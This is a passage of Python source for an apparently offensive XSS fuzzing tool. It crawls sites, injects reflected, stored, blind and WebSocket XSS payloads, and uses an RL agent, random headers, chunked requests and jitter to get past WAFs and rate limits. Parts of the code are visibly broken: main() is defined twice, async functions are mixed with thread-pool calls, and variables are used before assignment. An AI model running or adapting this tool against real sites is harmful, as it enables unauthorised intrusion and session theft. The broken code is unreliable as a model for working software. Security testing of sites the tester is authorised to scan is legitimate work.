    parts=[p for p in re.split(r'\.|(\[\d+\])',path) if p and p.strip()]
    cur=obj
    for i,part in enumerate(parts):
        last=i==len(parts)-1
        if part.startswith('[') and part.endswith(']'):
            idx=int(part[1:-1])
            if last:
                if isinstance(cur,list) and idx<len(cur): cur[idx]=val
            else:
                if isinstance(cur[idx],(dict,list)): cur=cur[idx]
                else: cur[idx]={}; cur=cur[idx]
        else:
            if last: cur[part]=val
            else:
                if part not in cur or not isinstance(cur[part],(dict,list)): cur[part]={}
                cur=cur[part]


async def fuzz_http(t: Dict[str, Any], use_chunked: bool = False) -> None:
    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
    if ext in static_exts:
        return
    
    key = f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}"
    if key in global_visited_http:
        return
    global_visited_http.add(key)
    
    target_param = random.choice(t["params"] or ["payload"])
    payload = agent.choose(target_param)
    sent_data = {p: (payload if p == target_param else "") for p in t["params"]}
    
    rate_limit()
    session_splice()
    
    try:
        if t.get("json") and "template" in t:
            body = json.loads(json.dumps(t["template"]))
            set_deep(body, target_param, payload)
            resp = SESSION.post(t["url"], json=body, headers=random_headers(),
                              timeout=HTTP_TIMEOUT, verify=False)
        else:
            if t["method"] == "GET":
                resp = SESSION.get(t["url"], params=sent_data, headers=random_headers(),
                                 timeout=HTTP_TIMEOUT, verify=False) if not use_chunked else \
                     chunked_fuzz_request(t["url"], "GET", random_headers(), urllib.parse.urlencode(sent_data))
            else:
                resp = SESSION.post(t["url"], data=sent_data, headers=random_headers(),
                                  timeout=HTTP_TIMEOUT, verify=False) if not use_chunked else \
                     chunked_fuzz_request(t["url"], "POST", random_headers(), urllib.parse.urlencode(sent_data))
        
        code, text = resp.status_code, resp.text.lower()
        reward = R_OTHER
        
        if code in (403, 429, 503) or any(x in text for x in ("captcha", "denied", "blocked")):
            reward = R_BLOCK
        elif code >= 500:
            reward = R_SERROR
        elif payload.lower() in text:
            reward = R_REFLECT
            # Use await with the async verify function
            if await verify(t["url"], t["method"], sent_data, t.get("json", False)):
                reward = R_CONFIRM
                log_hit(t["url"], t["method"], payload, t["params"])
        
        agent.reward(
            param=target_param,
            context="HTML_ATTR",  # or "JS_VAR", "HTML_TAG" based on reflection context
            action=payload,
            r=reward,
            next_param=target_param  # or None if no follow-up param
        )
    except Exception as e:
        dbg(f"[fuzz_http] {e}")
        agent.reward(target_param, payload, R_FAIL)
    jitter()

async def crawl_dynamic_async(root: str) -> list[dict]:
    """Async crawl with improved timeout handling"""
    seen = set()
    results = []
    host = urlparse(root).netloc.lower()
    MAX_RETRIES = 3
    VERIFY_TIMEOUT = 30000  # Increased timeout

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=get_playwright_args()
        )
        context = await browser.new_context(
            ignore_https_errors=True,
            user_agent=UserAgent().random
        )
        page = await context.new_page()

        # Setup request interception
        async def handle_request(request):
            u = request.url
            if urlparse(u).netloc.lower() != host or u in seen:
                return
            seen.add(u)
            
            # Process request (existing logic)
            method = request.method.upper()
            is_json = "json" in (request.headers.get("content-type") or "").lower()
            try:
                body = json.loads(request.post_data or "{}")
                params = list(body.keys())
            except:
                qs = urlparse(u).query
                params = list(parse_qs(qs).keys()) if qs else ["payload"]
                body = {}

            results.append({
                "url": u,
                "method": method if method in ("POST", "PUT") else "GET",
                "json": is_json,
                "params": params,
                "template": body if is_json else {}
            })

        page.on("request", lambda req: asyncio.create_task(handle_request(req)))

        # Retry logic with progressive fallback
        for attempt in range(MAX_RETRIES):
            try:
                for wait in ("networkidle", "load", "domcontentloaded"):
                    try:
                        await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until=wait)
                        break
                    except PlaywrightError as e:
                        logging.warning(f"[Attempt {attempt+1}] Goto timeout ({wait}): {e}")
                else:
                    continue  # All wait conditions failed
                
                await page.wait_for_timeout(2000)  # Allow late requests
                break
            except Exception as e:
                if attempt == MAX_RETRIES - 1:
                    logging.error(f"Failed after {MAX_RETRIES} attempts: {e}")

        await context.close()
        await browser.close()
    return results

async def _handle_request(request, host, seen, results):
    u = request.url
    if urlparse(u).netloc.lower() != host or u in seen:
        return
    seen.add(u)

    method = request.method.upper()
    hdr = (request.headers.get("content-type") or "").lower()
    is_json = "json" in hdr or "graphql" in hdr

    try:
        body = json.loads(request.post_data or "{}")
        params = list(body.keys())
    except:
        qs = urlparse(u).query
        params = list(parse_qs(qs).keys()) if qs else ["payload"]
        body = {}

    results.append({
        "url": u,
        "method": method if method in ("POST", "PUT") else "GET",
        "json": is_json,
        "params": params,
        "template": body if is_json else {}
    })

async def main():
    mode = "all"
    if args.reflected:
        mode = "reflected"
    elif args.stored:
        mode = "stored"
    elif args.blind:
        mode = "blind"
    
    roots = [smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
           (ap.print_help() or sys.exit(1))
    
    # Initialize reporting engine
    reporter = ReportingEngine(args.json or args.txt or "noctua_findings.md", 
                             "json" if args.json else "txt" if args.txt else "markdown")
    
    # Start Blind XSS Callback Server (if enabled)
    if args.blind_xss:
        callback_server = BlindXSSCallbackServer()
        asyncio.create_task(callback_server.start())

    waf, server = detect_context(roots[0])
    logging.info(f"[CTX] WAF={waf} | Server={server}")
    
    global agent
    agent = AdvancedRLAgent(waf, server, Path(args.qtable_file) if args.qtable_file else None,
                          enabled=args.self_reinforcement)
    
    for root in roots:
        logging.info(f"┌─▶ Crawling: {root}")
        
        # Discovery Phase
        if args.crawl:
            discovery = DiscoveryEngine(root, args.max_pages, args.nested_depth)
            discovery.crawl()
            static_t = []
            for form in discovery.discovered_forms:
                static_t.append({
                    "url": form["action"],
                    "method": form["method"],
                    "params": [i["name"] for i in form["inputs"]]
                })
            for url, params in discovery.discovered_params.items():
                static_t.append({
                    "url": url,
                    "method": "GET",
                    "params": list(params)
                })
        else:
            static_t = []
        
        dynamic_t = await crawl_dynamic_async(root)  # Need async version
        spa_t = await spa_dynamic_crawl_async(root) if args.simulate_spa else []
        all_t = static_t + dynamic_t + spa_t
        
        # dedupe by (method,url,params)
        uniq = {f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}": t for t in all_t}
        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://", "wss://"))]
        ws_t = [t for t in uniq.values() if t["url"].startswith(("ws://", "wss://"))]
        
        if "graphql" in root.lower(): 
            fuzz_graphql(root)
            
        if args.multi_session and (mode in ("stored", "all")):
            multi_session_stored_check(http_t)
            
        # Create tasks for HTTP fuzzing
        tasks = []
        if mode in ("all", "reflected", "blind"):
            for t in http_t:
                tasks.append(fuzz_http(t))
                tasks.append(fuzz_http(t, True))
        
        # Run all tasks concurrently
        await asyncio.gather(*tasks)
        
    # Check for any late blind XSS callbacks
    if args.blind_xss:
        await asyncio.sleep(60)  # Wait a bit for delayed callbacks
        for unique_id, data in callback_server.found_callbacks.items():
            reporter.add_finding(
                url="Unknown (Blind)", 
                param="Unknown", 
                payload=unique_id,
                vuln_type="Blind XSS", 
                evidence=json.dumps(data, indent=2)
            )
    
    reporter.write()
    if SARIF_OUTPUT_FILE: 
        write_sarif()
    agent.save()
    logging.info(f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}\n")





async def spa_dynamic_crawl_async(root: str, max_clicks: int = 20) -> List[Dict[str, Any]]:
    found = []
    host = urllib.parse.urlparse(root).netloc.lower()
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()
        
        async def on_request(request):
            u = request.url
            if urllib.parse.urlparse(u).netloc.lower() != host:
                return
                
            m = request.method.upper()
            is_json = "json" in (request.headers.get("content-type", "") or "").lower()
            try:
                post_data = json.loads(request.post_data or "{}")
                params = list(post_data.keys())
            except:
                qs = urllib.parse.urlparse(u).query
                params = list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
                
            found.append({
                "url": u,
                "method": m if m in ("POST", "PUT") else "GET",
                "json": is_json,
                "params": params,
                "template": post_data if is_json else {}
            })
        
        page.on("request", on_request)
        await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
        
        for _ in range(max_clicks):
            els = await page.query_selector_all("a[href],button,[role=button],.router-link")
            for e in random.sample(els, len(els)):
                try:
                    await e.click(timeout=2000)
                    await page.wait_for_timeout(1500)
                    break
                except:
                    continue
        
        await context.close()
        await browser.close()
    return found


def detect_reflection_context(html: str, payload: str) -> str:
    if f"<{payload}" in html: return "HTML_TAG"
    if f"'{payload}'" in html or f'"{payload}"' in html: return "HTML_ATTR"
    if payload in re.findall(r"var\s+\w+\s*=\s*['\"][^'\"]*", html): return "JS_VAR"
    return "NONE"

def fuzz_ws(t:Dict[str,Any])->None:
    if not websocket or not t["url"].startswith(("ws://","wss://")): return
    marker=randstr(); hit=False
    body=json.loads(json.dumps(t.get("template") or {}))
    param=random.choice(t["params"] or ["payload"])
    set_deep(body,param,f"<img src=x onerror=alert('{marker}')>")
    def on_msg(ws,msg): nonlocal hit; hit|=(marker in msg)
    try:
        ws=websocket.WebSocketApp(t["url"],on_message=on_msg,header=random_headers())
        thr=threading.Thread(target=ws.run_forever,kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
        thr.daemon=True; thr.start(); time.sleep(1); ws.send(json.dumps(body)); time.sleep(3); ws.close()
        if hit: log_hit(t["url"],"WS",json.dumps(body),t["params"])
    except Exception as e:
        dbg(f"[fuzz_ws] {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  MULTI-SESSION STORED XSS CHECK
# ─────────────────────────────────────────────────────────────────────────────
def multi_session_stored_check(targets:List[Dict[str,Any]])->None:
    # pass-1 inject
    for t in targets:
        if t["method"] in ("POST","PUT") and not t.get("json",False):
            for p in all_stored_payloads:
                try:
                    cs=rotate_csrf_token(SESSION,t["url"],args.csrf_field) or ""
                    data={k:p for k in t["params"]}
                    if cs: data[args.csrf_field]=cs
                    SESSION.post(t["url"],data=data,headers=random_headers(),
                                 timeout=HTTP_TIMEOUT,verify=False)
                except Exception: pass
    # pass-2 verify
    new_sess=get_authenticated_session()
    for t in targets:
        if verify(t["url"],t["method"],{},False):
            log_hit(t["url"],"STORED","(multi-session)",t["params"])

# ─────────────────────────────────────────────────────────────────────────────
#  MAIN EXECUTION
# ─────────────────────────────────────────────────────────────────────────────
AUTOTEST=["http://xss-game.appspot.com/","http://xss-game.appspot.com/level1",
          "https://juice-shop.herokuapp.com/"]



async def main():
    # Determine scan mode
    mode = "all"
    if args.reflected:
        mode = "reflected"
    elif args.stored:
        mode = "stored"
    elif args.blind:
        mode = "blind"

    # Prepare root URLs
    roots = [smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] \
            if args.url or args.autotest else (ap.print_help() or sys.exit(1))

    # Initialize reporting
    reporter = ReportingEngine(
        args.json or args.txt or "noctua_findings.md",
        "json" if args.json else "txt" if args.txt else "markdown"
    )

    # Start Blind XSS callback server if needed
    if args.blind_xss:
        callback_server = BlindXSSCallbackServer()
        asyncio.create_task(callback_server.start())

    # Detect WAF and server
    waf, server = detect_context(roots[0])
    logging.info(f"[CTX] WAF={waf} | Server={server}")

    # Initialize RL agent
    global agent
    agent = AdvancedRLAgent(
        waf,
        server,
        Path(args.qtable_file) if args.qtable_file else None,
        enabled=args.self_reinforcement
    )

    # Loop through each root
    for root in roots:
        logging.info(f"┌─▶ Crawling: {root}")

        # Discovery phase
        if args.crawl:
            discovery = DiscoveryEngine(root, args.max_pages, args.nested_depth)
            discovery.crawl()
            static_t = []
            for form in discovery.discovered_forms:
                static_t.append({
                    "url": form["action"],
                    "method": form["method"],
                    "params": [inp["name"] for inp in form["inputs"]]
                })
            for url, params in discovery.discovered_params.items():
                static_t.append({
                    "url": url,
                    "method": "GET",
                    "params": list(params)
                })
        else:
            static_t = []

        # Dynamic crawls (async)
        dynamic_t = await crawl_dynamic_async(root)
        spa_t = await spa_dynamic_crawl_async(root) if args.simulate_spa else []
        all_t = static_t + dynamic_t + spa_t

        # Deduplicate targets
        uniq = {
            f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}": t
            for t in all_t
        }
        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://", "wss://"))]
        ws_t = [t for t in uniq.values() if t["url"].startswith(("ws://", "wss://"))]

        # GraphQL fuzzing if applicable
        if "graphql" in root.lower():
            fuzz_graphql(root)

        # Multi-session stored XSS
        if args.multi_session and mode in ("stored", "all"):
            multi_session_stored_check(http_t)

        # Fuzz HTTP and WS concurrently
        exec_pool = ThreadPoolExecutor(max_workers=args.threads)
        if mode in ("all", "reflected", "blind"):
            for t in http_t:
                exec_pool.submit(fuzz_http, t)
                exec_pool.submit(fuzz_http, t, True)
            for w in ws_t:
                exec_pool.submit(fuzz_ws, w)
        exec_pool.shutdown(wait=True)

        # ─── DOM Analysis Phase ────────────────────────────────────────────────

        if args.deep_dom:
            try:
                async with async_playwright() as p:
                    browser = await p.chromium.launch(headless=not args.headed, args=get_playwright_args())
                    context = await browser.new_context(ignore_https_errors=True)
                    page = await context.new_page()
                    analyzer = DomXssAnalyzer(page)

                    dom_urls = discovery.crawled_urls if args.crawl else [t["url"] for t in http_t]
                    failure_count = 0

                    for url in dom_urls:
                        success = False
                        for wait in ("networkidle", "load", "domcontentloaded"):
                            try:
                                await page.goto(url, timeout=VERIFY_TIMEOUT, wait_until=wait)
                                success = True
                                break
                            except PlaywrightError as e:
                                logging.warning(f"[DOM] goto '{wait}' timed out for {url}: {e}")

                        if not success:
                            logging.error(f"[DOM] All goto attempts failed for {url}, skipping.")
                            failure_count += 1
                            if failure_count >= 10:
                                logging.info("[DOM] Too many timeouts, aborting DOM analysis.")
                                break
                            continue

                        try:
                            analyzer.vulns.clear()
                            await analyzer.analyze()
                        except Exception as e:
                            logging.warning(f"[DOM] Analyzer failed on {url}: {e}")
                            continue

                        if analyzer.vulns:
                            for vuln in analyzer.vulns:
                                evidence = (
                                    f"Sink: {vuln.get('sink')} on <{vuln.get('tag')} id='{vuln.get('id')}' class='{vuln.get('cls')}'>\n"
                                    f"Attribute: {vuln.get('attr')}\n"
                                    f"Payload: {vuln.get('payload')}\n"
                                    f"Stack trace:\n{vuln.get('stack')}"
                                )
                                reporter.add_finding(
                                    url=url,
                                    param="DOM",
                                    payload=vuln.get("payload"),
                                    vuln_type="DOM XSS",
                                    evidence=evidence
                                )

                    await browser.close()
            except Exception as e:
                logging.error(f"[DOM] Unexpected error in DOM phase: {e}")



    # Late blind XSS callbacks
    if args.blind_xss:
        await asyncio.sleep(60)
        for uid, data in callback_server.found_callbacks.items():
            reporter.add_finding(
                url="Unknown (Blind)",
                param="Unknown",
                payload=uid,
                vuln_type="Blind XSS",
                evidence=json.dumps(data, indent=2)
            )

    # Finalize report
    reporter.write()
    if SARIF_OUTPUT_FILE:
        write_sarif()
    agent.save()
    logging.info(
        f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}"
    )

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
try:
    asyncio.run(main())
except KeyboardInterrupt:
    logging.info("Scan aborted by user.")
